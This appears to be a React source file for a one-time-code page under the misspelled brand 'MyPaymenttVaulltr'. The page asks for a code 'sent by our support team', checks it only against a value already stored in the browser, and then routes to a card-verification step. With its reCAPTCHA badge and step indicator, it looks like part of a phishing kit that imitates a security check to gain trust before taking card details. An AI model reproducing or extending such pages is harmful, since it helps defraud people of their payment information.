import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
import { RecaptchaBadge } from "@/components/recaptcha-badge";
import { useI18n, type Language } from "@/lib/i18n";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

export default function BotOtp() {
  const [, navigate] = useLocation();
  const { lang, setLang, langName } = useI18n();
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const code = sessionStorage.getItem("botOtpCode");
    if (!code) navigate("/login");
    else inputRefs.current[0]?.focus();
  }, [navigate]);

  const handleDigitChange = (idx: number, val: string) => {
    const char = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[idx] = char;
    setDigits(next);
    if (char && idx < 5) inputRefs.current[idx + 1]?.focus();
  };

  const handleKeyDown = (idx: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (digits[idx]) {
        const next = [...digits]; next[idx] = ""; setDigits(next);
      } else if (idx > 0) {
        inputRefs.current[idx - 1]?.focus();
      }
    } else if (e.key === "ArrowLeft" && idx > 0) {
      inputRefs.current[idx - 1]?.focus();
    } else if (e.key === "ArrowRight" && idx < 5) {
      inputRefs.current[idx + 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (pasted.length === 6) {
      setDigits(pasted.split(""));
      inputRefs.current[5]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const entered = digits.join("");
    if (entered.length < 6) { setError("Please enter the 6-digit verification code."); return; }
    setLoading(true);
    const stored = sessionStorage.getItem("botOtpCode");
    if (entered === stored) {
      sessionStorage.removeItem("botOtpCode");
      navigate("/verify-card");
    } else {
      setError("Incorrect code. Please check the code sent to your email.");
      setDigits(["", "", "", "", "", ""]);
      setTimeout(() => inputRefs.current[0]?.focus(), 50);
    }
    setLoading(false);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center botp-outer"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 520px) {
          .botp-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            padding: 0 !important;
          }
          .botp-card {
            max-width: 100% !important;
            min-height: 100dvh !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
        }
      `}</style>

      {/* ─── CARD ─── */}
      <div
        className="w-full flex flex-col bg-white botp-card"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ROW ══ */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          <span
            className="select-none cursor-pointer"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
            onClick={() => navigate("/login")}
          >
            <span style={{ fontWeight: 700 }}>My</span>
            <span style={{ fontWeight: 300 }}>Paymentt</span>
            <span style={{ fontWeight: 700 }}>Vaulltr</span>
          </span>

          <div className="relative">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                color: "#555", fontSize: 13, background: "none",
                border: "none", cursor: "pointer",
              }}
            >
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555"
                style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}
              />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{
                  position: "absolute", right: 0, top: "100%", marginTop: 4,
                  width: 140, background: "#fff", border: "1px solid #ddd",
                  boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20,
                }}>
                  {languageOptions.map((opt) => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{
                        display: "block", width: "100%", textAlign: "left",
                        padding: "10px 16px", fontSize: 13, background: "none",
                        border: "none", cursor: "pointer",
                        fontWeight: lang === opt.code ? 600 : 400,
                        color: lang === opt.code ? "#111" : "#555",
                      }}
                    >{opt.label}</button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ══ HERO IMAGE ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img src="/hero-vault-new.png" alt="MyPaymenttVaulltr" style={{ width: "100%", display: "block" }} />
        </div>

        {/* ══ FORM ══ */}
        <div style={{ padding: "28px 28px 28px" }}>

          {/* Step indicator */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
            <div style={{
              width: 22, height: 22, borderRadius: "50%",
              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
              flexShrink: 0,
            }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none">
                <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <div style={{ flex: 1, height: 1, background: "#111" }} />
            <div style={{
              width: 22, height: 22, borderRadius: "50%",
              background: "#111", display: "flex", alignItems: "center", justifyContent: "center",
              flexShrink: 0,
            }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>2</span>
            </div>
            <div style={{ flex: 1, height: 1, background: "#ccc" }} />
            <div style={{
              width: 22, height: 22, borderRadius: "50%",
              background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center",
              flexShrink: 0,
            }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
            </div>
            <span style={{ fontSize: 12, color: "#888", marginLeft: 4 }}>Verification</span>
          </div>

          <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 4 }}>
            Verify Your Identity
          </h2>
          <p style={{ fontSize: 13, color: "#888", marginBottom: 22 }}>
            Enter the 6-digit code sent to your email by our support team.
          </p>

          <form onSubmit={handleSubmit}>
            {/* 6-digit OTP */}
            <div style={{ marginBottom: 20 }}>
              <label style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 8 }}>
                Verification Code
              </label>
              <div style={{ display: "flex", gap: 8 }}>
                {digits.map((d, idx) => (
                  <input
                    key={idx}
                    ref={(el) => { inputRefs.current[idx] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={d}
                    onChange={(e) => handleDigitChange(idx, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(idx, e)}
                    onPaste={idx === 0 ? handlePaste : undefined}
                    style={{
                      width: "100%", height: 50, textAlign: "center",
                      fontSize: 20, fontWeight: 600, color: "#111",
                      border: d ? "2px solid #111" : "1px solid #ccc",
                      borderRadius: 5, outline: "none",
                      background: d ? "#fafafa" : "#fff",
                      transition: "border-color 0.15s",
                    }}
                  />
                ))}
              </div>
            </div>

            {error && (
              <div style={{
                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
                fontSize: 12, padding: "8px 12px", marginBottom: 14, borderRadius: 3,
              }}>
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.6 : 1,
                letterSpacing: "0.04em", borderRadius: 3,
                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
              }}
            >
              {loading ? "Verifying..." : <><ShieldCheck size={16} /> Verify &amp; Continue</>}
            </button>
          </form>

          <p style={{ fontSize: 12, color: "#aaa", textAlign: "center", marginTop: 14 }}>
            Wrong account?{" "}
            <button
              type="button"
              onClick={() => navigate("/login")}
              style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
            >
              Back to Login
            </button>
          </p>
        </div>
      </div>

      {/* Footer */}
      <div style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
        <span style={{ fontSize: 11, color: "#888" }}>
          &copy; MyPaymenttVaulltr | Terms of Use | Privacy &amp; Cookies
        </span>
      </div>

      <RecaptchaBadge />
    </div>
  );
}
